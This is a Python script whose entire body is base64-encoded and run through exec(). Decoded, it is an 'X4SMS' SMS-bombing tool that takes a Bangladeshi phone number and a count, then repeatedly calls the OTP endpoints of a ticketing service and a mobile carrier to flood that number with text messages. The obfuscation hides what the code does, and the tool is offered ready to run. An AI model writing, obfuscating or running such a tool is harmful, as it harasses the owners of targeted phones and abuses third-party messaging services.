import base64
exec(base64.b64decode("aW1wb3J0IG9zCmltcG9ydCByZXF1ZXN0cwppbXBvcnQgdGltZQoKIyBDVkFMVUUKYmx1ZSA9ICdcMzNbOTRtJwpsaWdodGJsdWUgPSAnXDAzM1s5NG0nCnJlZCA9ICdcMDMzWzkxbScKd2hpdGUgPSAnXDMzWzk3bScKeWVsbG93ID0gJ1wzM1s5M20nCmdyZWVuID0gJ1wwMzNbMTszMm0nCmN5YW4gPSAiXDAzM1s5Nm0iCmVuZCA9ICdcMDMzWzBtJwpsaW5lID0geWVsbG93ICsgIj09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT0iCnNwYWNlID0gIiAiCmRlZiBsb2dvKCk6CglwcmludChncmVlbikKCW9zLnN5c3RlbSgnZmlnbGV0IFg0U01TJykKCnRleHQgPSBjeWFuICsgIlx0XHREZXZlbG9wZWQgQnkgOiBYNGNrIHRlYW0iICsgZ3JlZW4gKyAiXG5cblx0XHR4NHNtc1xuIgpub3RpY2UgPSAiIgoKCmRlZiBoZWFkZXIoKToKICAgIGxvZ28oKQogICAgcHJpbnQodGV4dCkKICAgIHByaW50KGxpbmUpCiAgICBwcmludChub3RpY2UpCgoKIyBTRUxFQ1RfTUFJTgpkZWYgb3B0KCk6CiAgICBwcmludChjeWFuICsgIlxuPT0+IFNlbGVjdCBvcHRpb24iKQogICAgcHJpbnQoeWVsbG93ICsgIlxuXG4gWzFdIFN0YXJ0IEJvbWJpbmdcblxuIFsyXSBKb2luIGZiIFxuXG4gWzBdIGV4aXQiKQoKCiMgTUFJTl9UT09MCnRyeToKICAgIG9zLnN5c3RlbSgnY2xlYXInKQpleGNlcHQ6CiAgICBvcy5zeXN0ZW0oJ2NscycpCnR0ID0gMQpoZWFkZXIoKQpvcHQoKQp3aGlsZSB0dCA8IDI6CiAgICBvcHQyID0gc3RyKGlucHV0KGJsdWUgKyAiXG5cbltlbnRlciBvcHRpb25dPT0+PiAiKyB5ZWxsb3cpKQogICAgaWYgb3B0MiA9PSAiMSI6CiAgICAgICAgdGV4dCA9IGN5YW4gKyAiXHRcdERldmVsb3BlZCBCeSA6IFg0Y2sgdGVhbSIgKyBncmVlbiArICJcblxuXHRcdHg0c21zXG4iCiAgICAgICAgdHJ5OgogICAgICAgICAgICBvcy5zeXN0ZW0oJ2NsZWFyJykKICAgICAgICBleGNlcHQ6CiAgICAgICAgICAgIG9zLnN5c3RlbSgnY2xzJykKICAgICAgICBoZWFkZXIoKQogICAgICAgIG51bWJlciA9IHN0cihpbnB1dChibHVlICsgIlxuXG4gWz5dIEVudGVyIFRoZSBCRCBOdW1iZXIgOiAiICsgeWVsbG93KSkKICAgICAgICBhbW1vdW50ID0gaW50KGlucHV0KGJsdWUgKyAiXG4gWz5dIEVudGVyIFRoZSBBbW1vdW50IDogIiArIHllbGxvdykpCiAgICAgICAgb3Muc3lzdGVtKCdjbGVhcicpCiAgICAgICAgbm90aWNlID0gY3lhbiArICJcblx0ICAgW+KAol0geDRzbXMgVG9vbHMgaW4gcHJvZ3Jlc3MuLi4uLi5cblxuIgogICAgICAgIGhlYWRlcigpCiAgICAgICAgYW1tb3VudDIgPSAxCiAgICAgICAgdG90YWxzZW50ID0gMAogICAgICAgIHRvdGFsbm90c2VudCA9IDAKICAgICAgICBpbXBvcnQgcmVxdWVzdHMKICAgICAgICBmcm9tIHJlcXVlc3RzLnN0cnVjdHVyZXMgaW1wb3J0IENhc2VJbnNlbnNpdGl2ZURpY3QKCiAgICAgICAgdXJsID0gImh0dHBzOi8vYXBpLmJkdGlja2V0cy5jb206MjAxMDAvdjEvdXNlciIKCiAgICAgICAgaGVhZGVycyA9IENhc2VJbnNlbnNpdGl2ZURpY3QoKQogICAgICAgIGhlYWRlcnNbIkNvbnRlbnQtVHlwZSJdID0gImFwcGxpY2F0aW9uL2pzb24iCiAgICAgICAgZGF0YSA9ICJ7XCJwaG9uZU51bWJlclwiOlwiKzg4IiArIG51bWJlciArICJcIixcImZpcnN0TmFtZVwiOlwiYXNpamZqeWZmXCIsXCJnaXZlbk5hbWVcIjpcImFzaWZcIixcImVtYWlsXCI6XCJuYXNhZ2tma2Zhc25pQGdtYWlsLmNvbVwiLFwibG9jYWxlXCI6XCJFTlwiLFwic2VuZE90cFwiOnRydWUsXCJkZWJ1Z1wiOmZhbHNlfSIKICAgICAgICByZXNwID0gcmVxdWVzdHMucG9zdCh1cmwsIGhlYWRlcnM9aGVhZGVycywgZGF0YT1kYXRhKQoKICAgICAgICB3aGlsZSBhbW1vdW50MiA8IGFtbW91bnQgKyAxOgogICAgICAgICAgICB0cnk6CiAgICAgICAgICAgICAgICBpZiAiMDExIiBpbiBudW1iZXIgb3IgIjAxOSIgaW4gbnVtYmVyOgogICAgICAgICAgICAgICAgICAgIHIgPSByZXF1ZXN0cy5wb3N0KCJodHRwczovL2Fzc2V0bGl0ZWFwaS5iYW5nbGFsaW5rLm5ldC9hcGkvdjEvdXNlci9vdHAtbG9naW4vcmVxdWVzdCIsCiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgZGF0YT17Im1vYmlsZSI6IG51bWJlcn0pCgogICAgICAgICAgICAgICAgZWxzZToKICAgICAgICAgICAgICAgICAgICBpbXBvcnQgcmVxdWVzdHMKICAgICAgICAgICAgICAgICAgICBmcm9tIHJlcXVlc3RzLnN0cnVjdHVyZXMgaW1wb3J0IENhc2VJbnNlbnNpdGl2ZURpY3QKCiAgICAgICAgICAgICAgICAgICAgdXJsID0gImh0dHBzOi8vYXBpLmJkdGlja2V0cy5jb206MjAxMDAvdjEvYXV0aCIKCiAgICAgICAgICAgICAgICAgICAgaGVhZGVycyA9IENhc2VJbnNlbnNpdGl2ZURpY3QoKQogICAgICAgICAgICAgICAgICAgIGhlYWRlcnNbIkNvbnRlbnQtVHlwZSJdID0gImFwcGxpY2F0aW9uL2pzb24iCiAgICAgICAgICAgICAgICAgICAgZGF0YSA9ICJ7XCJwaG9uZU51bWJlclwiOlwiKzg4IiArIG51bWJlciArICJcIn0iCgogICAgICAgICAgICAgICAgICAgIHJlc3AgPSByZXF1ZXN0cy5wb3N0KHVybCwgaGVhZGVycz1oZWFkZXJzLCBkYXRhPWRhdGEpCgogICAgICAgICAgICAgICAgaWYgYW1tb3VudDIgPT0gMToKICAgICAgICAgICAgICAgICAgICBwcmludChjeWFuICsgIlxuXHQgIOKYheKYhXg0c21z4piF4piFPT0+ICAgIiArIGdyZWVuICsgIlvinJNdIDFzdCBTTVMgU2VudC4iKQogICAgICAgICAgICAgICAgZWxpZiBhbW1vdW50MiA9PSAyOgogICAgICAgICAgICAgICAgICAgIHByaW50KGN5YW4gKyAiXG5cdCAg4piF4piFeDRzbXPimIXimIU9PT4gICAiICsgZ3JlZW4gKyAiW+Kck10gMm5kIFNNUyBTZW50LiIpCiAgICAgICAgICAgICAgICBlbGlmIGFtbW91bnQyID09IDM6CiAgICAgICAgICAgICAgICAgICAgcHJpbnQoY3lhbiArICJcblx0ICDimIXimIV4NHNtc+KYheKYhT09PiAgICIgKyBncmVlbiArICJb4pyTXSAzcmQgU01TIFNlbnQuIikKICAgICAgICAgICAgICAgIGVsc2U6CiAgICAgICAgICAgICAgICAgICAgcHJpbnQoY3lhbiArICJcblx0ICDimIXimIV4NHNtc+KYheKYhT09PiAgICIgKyBncmVlbiArICJb4pyTXSAiICsgc3RyKGFtbW91bnQyKSArICJ0aCBTTVMgU2VudC4iKQogICAgICAgICAgICAgICAgdGltZS5zbGVlcCgxKQogICAgICAgICAgICAgICAgdG90YWxzZW50ICs9IDEKICAgICAgICAgICAgICAgIGFtbW91bnQyICs9IDEKICAgICAgICAgICAgZXhjZXB0OgogICAgICAgICAgICAgICAgaWYgYW1tb3VudDIgPT0gMToKICAgICAgICAgICAgICAgICAgICBwcmludChjeWFuICsgIlxuXHQgIOKYheKYhXg0c21z4piF4piFPT0+ICAgIiArIHJlZCArICJbw5ddIDFzdCBTTVMgTm90IFNlbnQuIikKICAgICAgICAgICAgICAgIGVsaWYgYW1tb3VudDIgPT0gMjoKICAgICAgICAgICAgICAgICAgICBwcmludChjeWFuICsgIlxuXHQgIOKYheKYhXg0c21z4piF4piFPT0+ICAgIiArIHJlZCArICJbw5ddIDJuZCBTTVMgTm90IFNlbnQuIikKICAgICAgICAgICAgICAgIGVsaWYgYW1tb3VudDIgPT0gMzoKICAgICAgICAgICAgICAgICAgICBwcmludChjeWFuICsgIlxuXHQgIOKYheKYhXg0c21z4piF4piFPT0+ICAgIiArIHJlZCArICJbw5ddIDNyZCBTTVMgTm90IFNlbnQuIikKICAgICAgICAgICAgICAgIGVsc2U6CiAgICAgICAgICAgICAgICAgICAgcHJpbnQoY3lhbiArICJcblx0ICDimIXimIV4NHNtc+KYheKYhT09PiAgICIgKyByZWQgKyAiW8OXXSAiICsgc3RyKGFtbW91bnQyKSArICJ0aCBTTVMgTm90IFNlbnQuIikKICAgICAgICAgICAgICAgICAgICB0aW1lLnNsZWVwKDEwKQogICAgICAgICAgICAgICAgICAgIGFtbW91bnQyICs9IDEKCiAgICAgICAgdG90YWxoaXQgPSBhbW1vdW50MiAtIDEKICAgICAgICB0b3RhbG5vdHNlbnQgPSB0b3RhbGhpdCAtIHRvdGFsc2VudAogICAgICAgIHByaW50KGN5YW4gKyAiXG5cblx0XHRb4oCiXSBUb3RhbCBIaXRzIDogIiArIHllbGxvdyArIHN0cih0b3RhbGhpdCkpCiAgICAgICAgcHJpbnQoZ3JlZW4gKyAiXG5cdFx0W+Kck10gVG90YWwgU2VudCA6ICIgKyB5ZWxsb3cgKyBzdHIodG90YWxzZW50KSkKICAgICAgICBwcmludChyZWQgKyAiXG5cdFx0W8OXXSBUb3RhbCBOb3QgU2VudCA6ICIgKyB5ZWxsb3cgKyBzdHIodG90YWxub3RzZW50KSArICJcbiIpCiAgICAgICAgbGFzdHQgPSBzdHIoaW5wdXQoY3lhbiArICJcblxuXHRcdCAgW+Kck10gQWxsIERvbmUhXG5cdCBb4oCiXSBOb3cgUHJlc3MgRW50ZXIgS2V5IFRvIENvbnRpbnVlXG4iKSkKICAgICAgICBvcy5zeXN0ZW0oJ2NsZWFyJykKICAgICAgICBub3RpY2UgPSAiIgogICAgICAgIHRleHQgPSBncmVlbiArICJcblxuXHRcdOKYheKYheKYhXg0c21zIFNNUyBUb29sc+KYheKYheKYhSAgIFxuIgogICAgICAgIGhlYWRlcigpCiAgICAgICAgb3B0KCkKCgogICAgZWxpZiBvcHQyID09ICIyIjoKICAgICAgICBvcy5zeXN0ZW0oInhkZy1vcGVuIGh0dHBzOi8vbS5mYWNlYm9vay5jb20vZ3JvdXBzL3g0Y2tjeWJlcmFybXkvIikKICAgIGVsaWYgb3B0Mj09IjAiOgogICAgCXByaW50KHJlZCkKICAgIAlvcy5zeXN0ZW0oJ2ZpZ2xldCBnb29kYnllJykKICAgIGVsc2U6CiAgICAgICAgdGV4dCA9IGN5YW4gKyAiXHRcdERldmVsb3BlZCBCeSA6IFg0Y2sgdGVhbSIgKyBncmVlbiArICJcblxuXHRcdHg0c21zXG4iCiAgICAgICAgbm90aWNlID0gcmVkICsgIlxuXHRcdFvDl10gV3JvbmcgVmFsdWUgRW50ZXJlZCIKICAgICAgICB0cnk6CiAgICAgICAgICAgIG9zLnN5c3RlbSgnY2xlYXInKQogICAgICAgIGV4Y2VwdDoKICAgICAgICAgICAgb3Muc3lzdGVtKCdjbHMnKQogICAgICAgIGhlYWRlcigpCiAgICAgICAgb3B0KCkKICAgICAgICBjb250aW51ZQ=="))